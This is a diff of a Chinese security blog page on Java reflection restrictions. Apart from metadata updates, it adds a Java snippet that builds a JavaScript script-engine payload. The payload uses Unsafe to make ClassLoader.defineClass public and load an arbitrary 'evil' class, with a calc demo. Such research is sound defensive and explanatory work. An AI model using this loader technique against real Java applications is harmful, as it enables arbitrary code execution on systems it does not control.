@@ -367,8 +367,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-02-19 03:43:15</span>
-            <span class="mobile">2025-02-19 03:43:15</span>
+            <span class="desktop">2025-02-19 12:42:47</span>
+            <span class="mobile">2025-02-19 12:42:47</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -416,12 +416,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>21.9k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>22.1k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>90 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>91 Mins</span>
         </span>
     
     
@@ -848,6 +848,10 @@
 <h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>在分析出过滤条件之后，我们只需要设法满足上述条件即可绕过。通常来说我们都是通过修改被反射对象来满足 <code>checkCanSetAccessible</code> 的条件。</p>
 <p>还是以  JS 引擎动态加载字节码为例，这一过程中被反射类 <code>ClassLoader</code> 的访问属性 <code>public</code>，但是 <code>defineClass</code> 方法为私有方法因此不满足条件。</p>
 <p>我们可以通过反射修改 <code>defineClass</code> 方法对应 <code>Method</code> 的 <code>modifiers</code> 属性使得  <code>defineClass</code> 方法的访问修饰符为 <code>public</code> 来实现绕过。修改 <code>modifiers</code> 的过程既可以在 Java 代码中也可以在 JS 代码中。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJsPayload</span><span class="params">(String code)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;var data = &#x27;&quot;</span> + code + <span class="string">&quot;&#x27;;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var Unsafe = Java.type(\&quot;sun.misc.Unsafe\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var field = Unsafe.class.getDeclaredField(\&quot;theUnsafe\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;field.setAccessible(true);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var unsafe = field.get(null);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var Modifier = Java.type(\&quot;java.lang.reflect.Modifier\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var byteArray = Java.type(\&quot;byte[]\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var int = Java.type(\&quot;int\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\&quot;defineClass\&quot;,byteArray.class,int.class,int.class);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var modifiers = defineClassMethod.getClass().getDeclaredField(\&quot;modifiers\&quot;);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;unsafe.putShort(defineClassMethod, unsafe.objectFieldOffset(modifiers), Modifier.PUBLIC);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;var cc = defineClassMethod.invoke(&quot;</span> +</span><br><span class="line">            <span class="string">&quot;java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;cc.newInstance();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">manager.getEngineByName(<span class="string">&quot;js&quot;</span>).eval(getJsPayload(Base64.getEncoder().encodeToString(getEvilClass(<span class="string">&quot;calc&quot;</span>))));</span><br></pre></td></tr></table></figure></div>
+
+
+
 <h3 id="12≤JDK"><a href="#12≤JDK" class="headerlink" title="12≤JDK&lt;17"></a>12≤JDK&lt;17</h3><p><code>jdk.internal.reflect.Reflection</code> 中的 <code>fieldFilterMap</code> 用于存储需要被过滤的 <code>Field</code>，所有添加到这个 Map 的字段都不能通过反射获取。</p>
 <p>在 JDK11 中，这个字段仅对很少一部分类的个别字段做了限制：</p>
 <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 反射工具类，提供了 java.lang 和 java.lang.reflect 中使用的公共工具方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflection</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 用于过滤某些类中的字段和方法，避免它们被公共访问。</span></span><br><span class="line"><span class="comment">     * 这些字段和方法可能是敏感的，或者包含 VM 内部对象。</span></span><br><span class="line"><span class="comment">     * 这些 Map 很少更新。为了避免每次访问都进行同步，我们使用写时复制（copy-on-write）机制。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, String[]&gt; fieldFilterMap;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Map&lt;Class&lt;?&gt;, String[]&gt; methodFilterMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 静态代码块，初始化字段和方法的过滤 Map</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 HashMap，用于存储类及其字段的过滤规则</span></span><br><span class="line">        Map&lt;Class&lt;?&gt;, String[]&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Class&lt;?&gt;, String[]&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为 Reflection 类指定字段过滤规则，禁止访问 fieldFilterMap 和 methodFilterMap 字段</span></span><br><span class="line">        map.put(Reflection.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;fieldFilterMap&quot;</span>, <span class="string">&quot;methodFilterMap&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 为 System 类指定字段过滤规则，禁止访问 &quot;security&quot; 字段</span></span><br><span class="line">        map.put(System.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;security&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 为 Class 类指定字段过滤规则，禁止访问 &quot;classLoader&quot; 字段</span></span><br><span class="line">        map.put(Class.class, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;classLoader&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将过滤规则应用到 fieldFilterMap</span></span><br><span class="line">        fieldFilterMap = map;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化方法过滤 Map，目前没有设置任何方法的过滤规则</span></span><br><span class="line">        methodFilterMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
@@ -1337,7 +1341,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-02-19 03:43:15
+                    :</strong> 2025-02-19 12:42:47
             </li>
         
         <li>
@@ -1497,7 +1501,7 @@
                     </span>
                     
                         <span>
-                            478.3k words in total
+                            478.5k words in total
                         </span>
                     
                 </p>
